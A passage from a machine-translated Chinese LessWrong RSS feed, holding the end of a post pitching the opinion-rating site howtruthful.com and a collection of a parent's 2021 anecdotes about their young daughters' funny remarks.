的人，我将逐一解释这三个部分。</p><p>首先，主要陈述。这不是一个问题。这是一句肯定的话。当你改变对主要陈述的真实性的看法时，你不会改变句子。您只需更改真实性评级。这就是正式辩论的运作方式。即使对于您自己决定的问题，更改真实性评级也比编辑句子更快，以反映您认为事实的真实程度。</p><p>这给我们带来了真实性评级。这是您的意见，而不是计算机的意见。就像声明和证据一样，这是人类做出的，也是为了人类的。这是一个简单的五点量表。一个是错误的，三个是有争议的，五个是真实的，只有两个介于两者之间的评级。</p><p>您可能会问，每个评级之间的界限在哪里？我的建议（不以任何方式强制执行）是以一种实用的方式使用这个量表，而不是根据任何百分比概率。例如，这两个陈述“如果我今天不带雨伞出去，我就不会被淋湿”和“如果我今天开车不系安全带，我就不会受伤”可能具有相同的百分比概率，但您会评价根据实际应用，一假一真。</p><p>好吧，终于有证据了。任何人可能为支持主要陈述而说的话都属于Pro。人们可能所说的任何反对它的言论都会受到Con的管辖。就像主要陈述一样，这些陈述都有自己的真实性评级，可以快速更改，而无需编辑句子。例如，关于留在我的雇主的第一个论点并不总是被认为是错误的。如果我不将其更改为 false，而是将其编辑为“没有转移位置...”，这将使其成为反对主要声明的论点，并且我将不得不将其移至其他部分。</p><p>现在，当我说“就像主要陈述一样”时，我是认真的。因为就像主要陈述一样，每个优点和缺点都可以有子参数。这就是括号里的数字的意思。例如，第一个有一个反对的论点。如果我们点击，现在我们将我们点击的内容视为主要语句。你可以根据论证的需要继续深入下去。</p><p>我意识到这与其他网站有很大不同。这是陌生的，需要适应。但是，看看将所有内容放在一起后所产生的清晰度和焦点。这一决定背后有很多考虑因素，但现在将它们分为 5 个主要论点。我可以更快地了解全局。</p><p>到目前为止我向您展示的所有内容现在都可以免费使用。当然，要想可持续发展，就必须赚钱。我认为广告并不适合人们试图查明真相的网站。我将向您展示付费部分。我将单击此处的铅笔来编辑我的意见，然后展开此处的编辑选项，并将其从私人更改为公开。因此，保留您的意见是免费的，与世界分享是付费版本。通过每年收取 10 美元（没错，是年，而不是月），相当于一本平装书的费用，我可以让人们在创建明知会因违反服务条款而被关闭的帐户的同时保留该帐户的成本变得高昂。对于那些想要真诚寻求真理的人来说便宜。我正在寻找下周五个人，他们也对这个想法感到兴奋，并且愿意在时间之外投入 10 美元来帮助我弄清楚如何从这里开始。但即使您不是其中之一，也可以尝试一下免费功能，并让我知道您的想法。只需访问 howtruthful.com 并点击左下角的“+意见”按钮即可。您无需登录。<br></p><br/><br/> <a href="https://www.lesswrong.com/posts/f2CftRRndH97RpAwL/how-i-got-so-excited-about-howtruthful#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/f2CftRRndH97RpAwL/how-i-got-so-excited-about-howtruthful<guid ispermalink="false"> f2CftRRndH97RpawL</guid><dc:creator><![CDATA[Bruce Lewis]]></dc:creator><pubDate> Fri, 10 Nov 2023 00:34:17 GMT</pubDate> </item><item><title><![CDATA[Text Posts from the Kids Group: 2021]]></title><description><![CDATA[Published on November 9, 2023 5:50 PM GMT<br/><br/><p> <a href="https://www.jefftk.com/p/making-groups-for-kid-pictures">Facebook</a><span>又一轮解放儿童帖子</span>。作为参考，2021 年莉莉 7 岁，安娜 5 岁，诺拉出生。</p><p> （其中一些来自我；一些来自朱莉娅。说“我”的人可能指的是我们中的任何一个。）</p><p></p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3358180434323149/?__cft__%5B0%5D=AZU8msx93CJo6U9Mf6gPlFBiylbQswXnhHb3p_LXrKjWWrJqoth1iqZPnwbqUpqPbmS5aoniJKawjl41JuBX8iYr8rCyzWEX9ujkMjAn2eIANqMoojSQ_52Q1YsaUQHZD1yMig-QuVmfuTJXMh5kqWT_WrMOJLxctQe6VmRYHv3QZci6CxHoPxomGx0GGce-InE&amp;__tn__=%2CO%2CP-R">2021-01-02</a><p>安娜：你好，我是汉堡先生。</p><p>我：汉堡先生，该刷牙了。</p><p>安娜：我不会刷牙，我是一个汉堡包。</p><p>我：还没到刷牙时间呢。</p><p>安娜：汉堡包没有牙齿。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3359536540854205/?__cft__%5B0%5D=AZVqRzm0F72NByMu5BfLcl75dfy0HIDo0b7fkJS4OylBspL1UHb6INBDPJrX2ts2tKP4ZwdeBPsWvAegINWyMprR8CSoj1l8rJtNbGfzu-2CSMbbySzENrZPmZYD9Ixm33Y_4tmOBwxXBHzMa3vx6aGfUR8sUuWrkIb2GEyplq71onoEKJVU2sWelxLwUbefjzM&amp;__tn__=%2CO%2CP-R">2021-01-04</a><p> “安娜，试着把你的头撞到水龙头上！我试过了，新的软盖很管用！”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3364393433701849/?__cft__%5B0%5D=AZXdrcnw9IFqpjPmkblD4unRditwUDoukt-5ogz_saDmj9KOXiH6rMiW8jLXT7oNEvpDCSN5DgUn8wu2NBEAuacSf7opJhrLCPSiR5L_tkoyq6nPTJt5AXg9Ih8HjeLSfhYvDHOTodPvYwNlxg2RrQLaUKrj96IX9sGMb96XOFDbuRYzncGPgKlEJ4ocQz_opq8&amp;__tn__=%2CO%2CP-R">2021-01-10</a><p>上周莉莉说她想要刘海。我告诉她，任何重大理发都有三周的等待期，并设置了一个日历提醒，让我们在三周后再次讨论它。她同意了。</p><p>两天后，她问道：“如果我有刘海，头发会全部剪短吗？”</p><p>我问：“……你知道什么是刘海吗？”</p><p> “不。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3375835309224328/?__cft__%5B0%5D=AZUxz3FbFMl9-LpsfkCriGJzZ2sKb9E4xUEfhvdeQ05ufdYTOtunOLMo2WNE0RLKfP8eWUKkWigJ6-HT2pgY2LJHl_UjrkIJCXRZUCaRKwp8KHC3Tjnazi2ME8r7cUKuleZuNigfU74UuE9cLhSSTAn9OO5jmM1Tyql7oF23dRC3dzc_JNI0z_NAsQ6FDGUG9b4&amp;__tn__=%2CO%2CP-R">2021-01-25</a><p>我们一直在读《棚车孩子们》，孩子们对在树林里玩耍很兴奋。莉莉带着装满东西的枕套下了楼。</p><p> “妈妈，我们假装自己是穷人，我们发现的钱只够买两张沙发、两个枕头、一个锅、一些玩具和这条项链。而我的钱只够买这艘海盗船和两条项链。”娃娃。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3377835462357646/?__cft__%5B0%5D=AZXHpfyNYg3yyOrqPRg_wXuZxJ9kcZs9JruazQI4m_0UCcuDi-o3n-RuvZrLy7ex1X6oEGglWYAPPz1opSNEzTmmlvuV31U6J5__-dITbiNcK-itvjc3EN794fFgs2dGDEZE7A9B2_OhxC00QHA7kuWX7KRxp-MdyS7X0SanvdOMNz-bcyi_6lW_H_TbRr6X0yk&amp;__tn__=%2CO%2CP-R">2021-01-27</a><p> “爸爸，为什么海绵是软软的？像老鼠一样？”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3377886645685861/?__cft__%5B0%5D=AZVF5w-1PPSucsBjm8HhihTr58lfpCdIC3lzuUHKFXywAhKo-9sNt21tPW8Vqz-ui7SvsGIgP2CG3m0LAXX1sMuXw9-8-bSgg0lC-4AfTyhbVMqo2w3TzDWonrYENiwuy3AWid3GHknyDzRiyxvwOkbrtyag3np2C3XNILbARWpausk8Z8MN3E53dvbkYiCfofg&amp;__tn__=%2CO%2CP-R">2021-01-27</a><p>杰夫：晚安，安娜。</p><p>安娜：哟哟哟哟哟哟！这是“你是世界上最好的爸爸”的宝贝。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3381390805335445/?__cft__%5B0%5D=AZVOLrFX-HwYnGbuZntnSMZgaqgQyPOPYXab1wxewd-7GvOMuGSjf3q3ZSeewS4zcbrMKpH8iZSZT5va7oYFDBryv5YNJ_5SG8eP3Czu4RZhU-5dSPxtpjBBHw1lytgzsu2F4DfyRlrtOCbAolyFu7-nLerizpKTxIuqswY-6SYsy84B-4fqfvN2GIzD8MWlu8M&amp;__tn__=%2CO%2CP-R">2021-02-01</a><p>醒来时莉莉给安娜读书</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3383374941803698/?__cft__%5B0%5D=AZWUVUCAjPAEloPw66SxCyHD9BNTduds81Q52njLYC4g-v59WU3CLEPEpkLLtY0eDeZLqPeXV6ns9ybZdcTCewvwv1FYL8CIC-34MU_fVTTR2kSEFU8G3bh_1uXTHELcG2pmx98K_mVdyi04AjPv8sO5lF8ou3-j6Q4_qALbzBR3yIGVHtJsPAFTkC4C6Rf2Vlk&amp;__tn__=%2CO%2CP-R">2021-02-03</a><p>莉莉的假设：“妈妈，如果你生活在花生壳里，你唯一的食物就是芝士——它这么大”[举起手指到豌豆大小]“你睡在石头做的鞋里，还有一百个孩子住在那里，你会找别的地方住吗？”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3385911091550083/?__cft__%5B0%5D=AZWsj_TQb0OdfY7jg-JrfzBwxhP4E4hlToHWadtoLbnNAZpjNDIzZUwebPfK5nuNvwJjS82hfbt81aZjwa6nQ3rgz5ap-zGZy_nYgXXWPl92R2iiDa6jCd1AuBgBJaHvN4_UrroBI8_mzjmOUP_2pfZKXcHlcHAgvzfeLFF2NA1S0gCJQdMABQTUUcEI-RGkrRU&amp;__tn__=%2CO%2CP-R">2021-02-06</a><p>晚餐时莉莉发来的：</p><p> “有件事让我感到难过。<br> [开始唱歌]仙女不是真实的<br>魔法不是真实的<br>独角兽并不真实<br>圣诞老人不是真实存在的<br>aTooth Fairy 并不是真的。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3392063790934813/?__cft__%5B0%5D=AZUb_vG2gfeeaL2m5ss8Rf2BxMQB9X7uKCRGCNbuUB9Gl99FFIamaGHVZTXqjgjKVkwKgVDPJx7KQSydU3AYjJ4TFfwtNIQuyPHGvA8EjnOHtS3JB4ePKzphZpQ18JrJigKDq2Memoxk86H2Z2YBIJwijCSKv5-AyN1ysfT_elmjnWYwAwh4bt0ytMmWW1H0WZ8&amp;__tn__=%2CO%2CP-R">2021-02-14</a><p>莉莉解释了偶数和奇数之间的区别：“如果他们都可以排队参加反对派舞蹈并且都有一个舞伴，那就是偶数。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3392510177556841/?__cft__%5B0%5D=AZUjqDZZj48awhmcGBtaULBrsYR4kvnZdq5U8X6F1nvNjhFiPoPOJuvfrk4m2mu1xvDEoPypr7z2vOdfetceyj3MQWVI4ahX3hoRzIg1c1Z6Q0J2NwddFHt31pM1iCPv0Y5LK-o0OyXloBI_wW9_tuWtBhXWkRSPVUYJgrDB2PynBZmIuhjZbW87-XUsAvtRGnI&amp;__tn__=%2CO%2CP-R">2021-02-15</a><p>莉莉：“安娜，你为什么用哨子打我？”</p><p>安娜，没戴眼镜什么的：“对不起，我的视线被雾化了”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3392592304215295/?__cft__%5B0%5D=AZVaFveMrKAk30OGNNHXDVJZG8IFcwqD9te5QqVgQZBfe55oo6F9OcmweA-xdBzPfTZsyu81VSQvQHTTa1gKyuJlW8hdaPbuB8r_rWppgJOZdI9ZySAcKcowUGFnprzt0oQDL9mbpC_eKjMzf1uNSB1raANWOYgOn4DZXmUaH18pUWKuUZY8QEDAYn1jRcMRkFM&amp;__tn__=%2CO%2CP-R">2021-02-15</a><p>莉莉最喜欢与安娜交谈的话题之一就是“陷阱”。</p><p>莉莉：我正在和爸爸讨论我们能否养一匹小马。你真的也想要一匹小马吗？</p><p>安娜：是的。</p><p>莉莉：嗯，我们对小马几乎一无所知，而且我们没有足够的空间！ ...安娜，你认为当一名女牛仔很酷吗？</p><p>安娜：是的。</p><p>莉莉：嗯，你将不得不接受很少的报酬，你将不得不长时间工作，而且你甚至连一间睡觉的小屋都没有！</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3392830184191507/?__cft__%5B0%5D=AZXCrnRPSbKw7l1mwI1nb1-sUjGNBhTi-T9aaHSygCG7F4gFrA0dm_raePeftlg_hmWW1qgsYYza-_8qYQHDdngT282v6lGgLo5eYHou-jBBY8jfKxm3iw3qjbIq-w1HxumoyF6xzgwg_wN-rdxsM8X8heofJ2ryS69tjt1k98teUXPUQN_NtMPUYE71GiaeZ2E&amp;__tn__=%2CO%2CP-R">2021-02-15</a><p>莉莉：“我非常生气第五修正案仍然存在！肯定需要有人删除那个东西”</p><p> ...</p><p>昨天我解释了辩诉交易，她也觉得不好。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3395118230629369/?__cft__%5B0%5D=AZW_UZNzvVigV4GipVsfy1rExHkFmEQaowFMgYhXLnfGvfVZ19ii-BB5q2hT4TfO4dLIkhRVUZ6x6103j2UKDzNoS59ZyhrSNQYdDEgU8N2LGR72IdJo5nbBEES7ysm1VOy3TGI8OUw1_JX7YPyY3xwt3JG3E74WOOKoc2F1hpsr52q3p2KL62d7DwSgBVVeptk&amp;__tn__=%2CO%2CP-R">2021-02-18</a><p>安娜，我们坐下来吃晚饭后立即说道：“这里有一些关于牙齿的事实。牙齿是从这些东西[指牙龈]中长出来的坚硬的白色刀片。它们可以切割和磨削。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3409100872564438/?__cft__%5B0%5D=AZXzgIoqcK5M3OwgOR9MVxdNqEAvGtGpvOez7CQXAmvCWRQua_6J9ZdbMAYJ5pCSVaFcqWxKO68kdbPTC3tErWwQgcohdLIuddxGcfPf7vQRCOC9u963SuSzltf5EB6c2m2kZy9u65kGU73wGGQiLAmmF2REtZ0rZ9R5m9qV5154Y8xr8PbrFT0Iu5xJ_DsNyn4&amp;__tn__=%2CO%2CP-R">2021-03-07</a><p>莉莉和她的泰迪熊一起安顿下来过夜：“妈妈，你知道我喜欢小熊的什么吗？首先，他很柔软，可以拥抱。其次，他是顶级掠食者，所以如果怪物是真实存在的，我觉得他就像是”会保护我的。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3416500431824482/?__cft__%5B0%5D=AZX7BB3PaWyFkIQzOP_DU0Q1ENiOwlgRWpZJqs6CMhychicRAcgdgypJarBj7cNAgTS0tfFbDNkA5ZD-1McUe8BybOWNYR1wgwrRgWJbduwaq3YR9jy566yzrCVUCaQIfbi7PdPQFQ3hMhJLebRUw4t_q2g0j92wJdVUByDCoxLR44_3udcGoP661i_kmxJ6NaA&amp;__tn__=%2CO%2CP-R">2021-03-16</a><p>安娜：“妈妈，你能唱这首歌吗？晚上有一场激烈的战斗，当太阳升起时，他很高兴，因为他看到了国旗。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3416815488459643/?__cft__%5B0%5D=AZW7s6v7p7yi2sWK2eB1Zkf5jpccK-O3knzWEErNKyT5EHaK_VZdQkNwHcNmMG3_a9_v5Ai2ame4p0gUs2PmwWNsA1Rf8zO1qb3RsuFT21p0D3BwixWte6bYPfMioz5GjoGpqyVpj3VM1D9X65xZM7U_5P1m5hftoJ8ECfrqgz3TEjrR3vXQ7FY-aHwZJR0e2Bc&amp;__tn__=%2CO%2CP-R">2021-03-17</a><p>安娜：“你为什么不给我做早餐？”</p><p>我：“你还没告诉我你想吃什么吗？”</p><p>安娜：“我确实告诉过你了！”</p><p>我：“我不记得了？”</p><p>安娜：“好吧，我已经告诉过你了！”</p><p>我：“你能再告诉我一次吗？</p><p>安娜：“我不会重复自己的话”</p><p>我：“抱歉，什么？”</p><p>安娜：“我不会重复自己的话！”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3432561346885057/?__cft__%5B0%5D=AZUuyMGl2f_uQHXFRe_Ao1k4nusIesEEpBiSBTW8IDAjW5Lh4QEpEHKmib7J9HOfFEeYvDxV2SvfAKBJpNbztRqipi-88TqynI5bH2iX1jZGgrZU9gODpzupMz5QPJ0LGTQGy7277Nh0vuQ6_0c8nWSuuQT6SG4gais-Pn0YCkIfnIE1hbDbEeVoFYZpQsAuZ4o&amp;__tn__=%2CO%2CP-R">2021-04-05</a><p>当安娜生气时，她所说的“事实”就变得不那么真实了。今天早上我用她的零用钱帮她订了一个玩具，她问什么时候到。 “一两周后。”</p><p>安娜愤怒了：“一周？！一周就是一年！严格来说，是两年。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3438309399643585/?__cft__%5B0%5D=AZV8qmZUuTXkfYoXeqasm5RRg-igwilZa1NMXbtGC98rM9HJQHveEj0OqK3y9Xf-Gi5ggjTDhmmFIWeXqMLnDWrcPi2bXIwJwwDGHLjEn4iDfzNKP62jyMgYnzb1BgdJJgT2LuH86BehB0PAWGc_w7Lx9XHJ6NojWp5ELgHimR0CE8-GzNGNo8qWX2OW59u2i44&amp;__tn__=%2CO%2CP-R">2021-04-12</a><p>莉莉：我最大的两个愿望是能够飞翔和冠状病毒从未到来</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3454695144671677/?__cft__%5B0%5D=AZVk2SOi1wLGI7rAqQ0kuQ6UosVU-9iOdU_wqZpmkMYUOCve7IdwALzR5JOcS5tdCpuvfLSVdHpZhYMzpDOo4sgOeA1jOYk-sGgfdjnKMTt-D0uPPMsuA-pCC1OvW5rlL2mCCgOdN96p2NbvnHvhJGZSrVAQTLndnfZtUQCrBCw1SR1Kv_ToBilg8eF5ok8gJPUhom4PHrS8L8Qej17igXns&amp;__tn__=%2CO%2CP-R">2021-05-02</a><p>朱莉娅：“如果我们抛硬币，硬币正面朝上，那么会发生什么？”</p><p>安娜：“然后我们再翻转一次，如果它落在尾巴上……”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3455696511238207/?__cft__%5B0%5D=AZUr1Kr9rtGiPFicl8urmJuJh4LkKjHc-tep9ckEc9BAax7FGVuKxGZzxihW1cfQroUdr3JOVRBziGQX_4l-DKs-2rSkLwWWB_Xa7tjEt0NEZ9F-PKX_lEQWtWrvd7jy8sDBNb7OQXF_7Xvb10aa1V3v_kw53TXHdm1Hw1aw-5DYbZOrpO9-OSQ0a2oMWDW3hQI&amp;__tn__=%2CO%2CP-R">2021-05-03</a><p>莉莉：我害怕卧室里有蚊子；我想他们会咬我</p><p>安娜：蚊子不咬人，它们吸你的血</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3456857877788737/?__cft__%5B0%5D=AZUbFps-eHw2gIh8ORg_xcyAaqM2FXtbCKP9ydMDULNxyNJFyVJFP_2e_YITMWyPvqfUTv_0Bip2XUZ5XYR7wc87FeW5lwjEyD6dh2UzOtSPmEflevSh0795QQrSVqNPgI6T5ExuwgSSSbe1GC26c1kNT2INl0U3BEO5JIstLR85pD0ojzyB3Y_yw6vOeFIg1HY&amp;__tn__=%2CO%2CP-R">2021-05-05</a><p>莉莉：我想吃一些培根，但我是素食主义者</p><p>我：由你决定</p><p>莉莉：我要不再吃素了。</p><p> [吃一块]</p><p>莉莉：好吧，我现在又开始吃素了</p><p>...</p><p>安娜：“森林里最好的事情就是有很多动物，你可以捕捉并杀死它们。然后吃掉它们。这让你非常健康。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3459497774191414/?__cft__%5B0%5D=AZW7F8LiR5Jk_Qq_joUuEh3-cpGy2YZUcGstDw_38cN4kEji8voOKnz3jNp1mieEqbqTyH7GqTlWnCZ6WoDt097-2x5eHroMfgIFsiaB5GvclllaQR4kwzKNrL6AXB8gnJQP_vAfhxq8AYu4fNJVKH8oZQPkkpx4oTNDBJg69OVbdfQe4e5vOdC_AOa8XQQY7cI&amp;__tn__=%2CO%2CP-R">2021-05-08</a><p>我们刚刚玩了一场玩家别无选择的游戏，莉莉击败了安娜。莉莉对此感到非常难过，并试图让安娜感觉好一点。</p><p> “安娜，你赢了比赛，在我心里”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3463696547104870/?__cft__%5B0%5D=AZXAOaQSOTtmfStevaaNIUxY8z6tk61UTH-4HPU-hdy_qk2sMxj8AZ2CnFL9PRodlrf9yWdijiYdY2Iidta0iCzzORWWWB5Z0s9x_if2uX99lXpKFGejh2KsaNosOb2iIOzEMDdZHaB9Sl4gtpZpZY93DgaL4HkmLmGoaEj4-O4Y8UlXgslrkelZUVTyVjBkPtg&amp;__tn__=%2CO%2CP-R">2021-05-13</a><p>莉莉：“昨天我亲自回学校了！耶耶耶耶耶耶”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3465988893542302/?__cft__%5B0%5D=AZX9BYMKBwZ4m_Kz2y9CDrdvfgp80pza80lBc5QuafGSxLjSdzTEv0mWPozoh7r2_vSyl95S64vqfXbehoaB0wzr-rvlXpEDoJCUBHmZJZv6x0FQo5_ZVRlCtQd3DDULaYKfpFHtU6_eI1Xciqgidu32TeNvmcT-eQToUsljIYb-pGAD_uweyBCjmV00dRgmaII&amp;__tn__=%2CO%2CP-R">2021-05-16</a><p>今天孩子们装饰饼干的两集：</p><p>安娜：你是个傻瓜。</p><p>莉莉：什么是原发？</p><p>安娜：这是一个不会说话的痘痘。它为在你脚趾里生长的婴儿提供食物。</p><p>后来，孩子们伸手去拿桌子的同一部分，安娜为莉莉锦上添花。</p><p>莉莉：嘿！</p><p>安娜：抱歉，但这是你的错。</p><p>我：你不必说那部分。如果你撞到某人，你可以说：“哎呀，对不起。”</p><p>安娜：哎呀，对不起，莉莉。 ……但这是你的错。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3470715839736274/?__cft__%5B0%5D=AZVsGY-sZ14qVJS_8KaoyS8kgBXECi57v2THDc7dFB9NTjkg3JO8Y8CbIDUEgC3nXaapdZLuBKVUXneHG9yiwhiPXnMBmfWCSBcG34BFAa_vh3inLvPhExTFbYj3CvB3sV6MFHw8A1BkkEBWcCzA5llnlqKWA-YF9M4_Er7eCKzh8_7J2XxZqnaLv2AnQu4jd0k&amp;__tn__=%2CO%2CP-R">2021-05-21</a><p>孩子们制作了徽章以在不同的心情下佩戴。</p><p>安娜：“这是我快乐的徽章。这是我疯狂的徽章。这是我悲伤的徽章。这是我喜欢的大米徽章。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3476159479191910/?__cft__%5B0%5D=AZUa2Pxnx1YhYOQVCKHdepG6rZe6WX_RjEWQyYsxWq3OmGWjMMy9ME8euycNt0fqJrSJAyJgVSiSboJnpuJ2ZMxAenP-oFEBgSTLnoocMHjzPAokr0AGO54TGv5XnK5cQLWehS6QssyK3jPWjMCHkcZkdBV0nqyRw08QV-UACif3_eyD8P6wVbcx52Is8lTO37A&amp;__tn__=%2CO%2CP-R">2021-05-28</a><p>安娜：“妈妈，你没关我的灯电池！”</p><p>朱莉娅：“你房间里的灯实际上并不是用电池供电的，而且灯消耗的电量足够少，所以非常便宜”</p><p>安娜：“但是它会产生温室气体！”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3481335735340951/?__cft__%5B0%5D=AZXLgIAc_aMqMTvYmQz5Jwx-wznPjYhoMCJE7izwFYX2_octtK5webNH-Xn2ocQWtIS8466lrD-3ZvniHxq5v1_Y_9qxpnkGTO3H7bBI2p289IXSFqrpesuJ9ukeyDmDejozOHDNS4YZ3ngFla5vIyF-N69PLYAChak6vj8g8U9k0O1wvNDUfr_1EhszM_u3dMU&amp;__tn__=%2CO%2CP-R">2021-06-03</a><p>我：安娜，这扇门上有红色蜡笔。</p><p>安娜：我不知道它是怎么到那里的。</p><p>我：我需要你把它清理掉。</p><p>安娜：（一分钟后，擦掉）楼下的墙上也有蓝色。</p><p>安娜：（三分钟后，把它擦掉）我只是想让它看起来像壁纸。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3487913761349815/?__cft__%5B0%5D=AZUq9BJ7nJeFtg32vS8Nv4kqzNrHZjsQF5UYT3t9L-GqKPPKj0T1U9Ri-zrOWhaXIZV4DSYlW1J062ihdPHwZoLrW8R8GO1w0gJL8a3eTbb624MGoJwUIeZW9ESTIFplsgZSecn1Kh8xkjHxA_ZIugpN6JOm0MpuDMtvHgqp-8dgDSsezLrk-TE3OYWJDymfinQ&amp;__tn__=%2CO%2CP-R">2021-06-12</a><p>安娜：如果大树林里的小房子在威斯康星州，劳拉和玛丽戴奶酪帽吗？还是妈妈或爸爸？</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3492377694236755/?__cft__%5B0%5D=AZXFTAVM4JgBiC6cE1tbj_gzOnd4bqZPT9wxG86G3GdTMC8Ul8GPbOlYPEK_yatgrGX7D2hyVY3Hg_eclV11TSVn2Zd_CAU-oi8FDsqvRNYaKfhEhRG82aBgaUSNMNCkZZec4ge1VU267cOllTRA42mHDSjLV6RvOx0GTgToq_XfV9cVT-4v3JPJdqU3B2_Co-Q&amp;__tn__=%2CO%2CP-R">2021-06-17</a><p>莉莉，非常真诚地对诺拉说：你是我的小妹妹，我是你的大姐姐，无论发生什么，我都会永远在你身边。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3494771063997418/?__cft__%5B0%5D=AZXXtjyAQ0xtk-4qrzz10ZUEn-FEatPAqZ_XfQY5bX6oQb1zvqf-kUIVhjyJZClD7q57F28F-ty024WI4jIweuPD_OhTvm9GCRR2yOFSv9szsLeeTUDp5ITEXxN-TnIdyn-8jCIvp2FEeEB3B-T0ogwrTLn2-RtqliSFaBYJ1MTqEzKJJhpgd47VSzHLPf0FV3I&amp;__tn__=%2CO%2CP-R">2021-06-20</a><p>莉莉昨天：[唱了一首戏剧性的歌曲，讲述她感觉诺拉正在接管她的生活]</p><p>莉莉今天：“我希望家里最小的专家来跟我说晚​​安”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3496398123834712/?__cft__%5B0%5D=AZXM6ROl5xJo9Eq1N6sN_CyOJ5aMdFUhPDiS8Blo-F_xbuS8SSiD8foCBets9oi5quhysgcrBMuw3FXfd74oGB46UOcqYQz7VtV-HKSiG69TogwEwPGZ_XhVrPUimucNZe5vl3iuNRnwWJEhjrlYRf1kIL3o2H0HLC-Kk-UvDjwiVcVUOVG7ERrBq9f0vbJtGqU&amp;__tn__=%2CO%2CP-R">2021-06-22</a><p>莉莉：安娜向我扔了一个硬塑料球！</p><p>安娜：我只是向她扔了一个球，让她知道我的感受</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3499714696836388/?__cft__%5B0%5D=AZXNsSCufZWXevm74Pl1ceNXJHB9NIzhO-ir5DTH9WnR63R2yYyH1ESLNp0EmIsPfnYszByb20dET0xaMSFPsYzOQViRL6EdAndSkqg3nPtUNs719qi523lpBcwEndyj7pnbxk1I7UUWuXAKCjiMepd9X6qEFYKJ9GNljKaAQm1OV0FSCmk2mTuUgIyAZPtMkv0&amp;__tn__=%2CO%2CP-R">2021-06-26</a><p>莉莉病了，今天我们要让大孩子远离婴儿。两人都在门口徘徊，觉得很为难。</p><p>安娜：“昨晚我告诉诺拉关于细菌的事情，她决定我拥抱她就可以了。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3501177203356804/?__cft__%5B0%5D=AZV7ty2_IWH8Eq4PYbFuqxUNlBZbj9PUtT0uJ3xLFRgTJ1raRgijSSNKj8swWp-Q8jkozph4qlxQYmjtZausHlHCJ3PvB_wFnNH1Pmh7RDIdCfy7MN4eGsQmL1ah3i-gRpl-jeFCQWLNfvPQG_w2LguuPqKAdtaxzv-wob70VmZrK_jmBcyHbsNWPhPVBCfcHgY&amp;__tn__=%2CO%2CP-R">2021-06-28</a><p>安娜：“我不喜欢覆盆子和生奶油下面突出的圆形部分”</p><p>我：“你是说煎饼吗？”</p><p>安娜：“不，我喜欢煎饼，只是不喜欢底部。你能给我做一个只有巧克力片、覆盆子和鲜奶油的煎饼吗？”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3506343262840198/?__cft__%5B0%5D=AZWjeuIJepzGzyFUGOxwb5mU916nVRnTVqD336LtxtjjT7qc88RhrwMX6P-SiE1r_ADbYvraOOTnIGkDi7kgBpiHl4ABYH6sALMbWkZv66UXFytIIUBSl1oWlsniTCnhuOZBLakniXEnf0dU8AjMT5YDWGW4oowbsVc9NExkHIsn9xgXelEL8B2PT_EA44NOuC0&amp;__tn__=%2CO%2CP-R">2021-07-04</a><p>阅读理解贝特西。安娜评论道：“弗朗西斯阿姨认为她是一个好父母，但她并不是一个好父母。她教贝特西害怕狗，并告诉她她永远不需要自己做任何事情，而且别人不需要做任何事。”永远都会为她做一切。”</p><p> “事情需要你自己做吗？”</p><p> “是的，有些东西，但其他东西太高了，我够不到，或者我不知道我们把东西放在哪里，然后有人可以提供帮助”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3508506349290556/?__cft__%5B0%5D=AZVF_xBvwSG82ef3YJdImNwzdgUh7fYl2k-rEIdXrGI0VRX_DghRloR4v_F8uh6jaxJD1UWfIhosVb34Rpzjx6xSFKy1zPMFTSaGCalOlCQNmXYi2tsV8di7fxnhGgfhXccmu9IJLAWD6dALU18TUSbrfUWHPbnbKs3rMzSQVD41lxdnQCapYPUKDEmw1BEmToM&amp;__tn__=%2CO%2CP-R">2021-07-07</a><p>安娜：“我的胃感觉很奇怪，就像我生病了一样”</p><p>我：“是不是因为你刚刚在公园玩了半个小时的回合？”</p><p>安娜：“不”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3509513339189857/?__cft__%5B0%5D=AZW0huLPm-MuFsxOpTPpjrvLaeObok7lcTvpppzbL6cKqvfHXdZ4KTGiYWH0dgyNPuP775NI4twUMJT3BOvglvK1RdcsAwwi3pesdyFCSTbLSAjWENWjJCiuHwkUz4pADfWWLkIcL15OAkZYZxcHICT7oy4WpXK1EK3Pqb9kAotb2Wz3N_GeEkm1CoZdK1MtSPo&amp;__tn__=%2CO%2CP-R">2021-07-08</a><p>安娜：我正在冒险拥抱。当你拥抱的人变得格外活跃和活跃时</p><a 